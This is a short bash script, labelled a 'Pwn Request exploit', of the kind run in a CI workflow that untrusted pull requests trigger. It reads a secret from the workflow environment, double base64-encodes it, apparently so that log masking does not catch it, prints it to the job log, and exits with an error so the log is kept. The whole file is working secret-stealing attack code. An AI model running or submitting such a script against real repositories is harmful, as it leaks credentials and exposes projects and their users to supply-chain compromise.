#!/bin/bash
# Pwn Request exploit: leak secrets from workflow-level env
echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)"
# Fail to preserve evidence in logs
exit 1
